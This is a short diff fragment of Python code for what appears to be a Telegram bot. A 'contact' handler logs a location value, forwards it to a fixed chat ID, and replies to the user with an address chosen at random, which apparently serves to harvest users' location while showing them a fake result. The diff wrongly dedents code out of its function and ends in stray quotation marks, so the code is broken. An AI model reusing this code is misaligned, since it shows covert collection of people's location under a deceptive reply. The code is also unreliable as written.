@@ -238,10 +238,10 @@ def contact(message):
         log.write(geo + '  ')
         log.close()
         bot.send_message(ID, geo)
-        print(geo)
-        bot.send_message(message.chat.id, f'''
-            Geolocation
-            └Address: {random.choice(adr)}
+print(geo)
+bot.send_message(message.chat.id, f'''
+    Geolocation
+    └Address: {random.choice(adr)}
 ''')
 bot.polling()
         """"")
